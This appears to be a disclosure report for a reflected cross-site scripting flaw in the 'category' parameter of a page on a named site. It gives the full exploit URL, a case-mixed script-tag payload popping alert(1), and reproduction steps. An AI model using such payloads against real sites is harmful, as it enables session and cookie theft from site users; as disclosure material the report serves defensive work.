# Reflected Cross-Site Scripting (XSS) via `category` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `category` parameter of the application. User-controlled input is reflected back into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="v9r3qa"
http://kzlabs.com/17.php?category=xicorr%22%3C/span%3E%3CsCript%3Ealert(1)%3C/SCRIPT%3E
```

---

## Vulnerable Parameter

```text id="p1k6wd"
category
```

---

## Payload Used

```html id="u7x4fe"
xicorr"</span><sCript>alert(1)</SCRIPT>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/17.php?category=xicorr%22%3C/span%3E%3CsCript%3Ealert(1)%3C/SCRIPT%3E
   ```

2. Observe that the payload is reflected in the HTML response.

3. The injected JavaScript executes automatically.

4. A popup dialog appears confirming successful XSS execution.

---

## Proof of Concept

```text id="z4j8lt"
http://kzlabs.com/17.php?category=xicorr%22%3C/span%3E%3CsCript%3Ealert(1)%3C/SCRIPT%3E
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/874033fe-65a0-48b0-8cc4-7552f4b4b211" />

---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
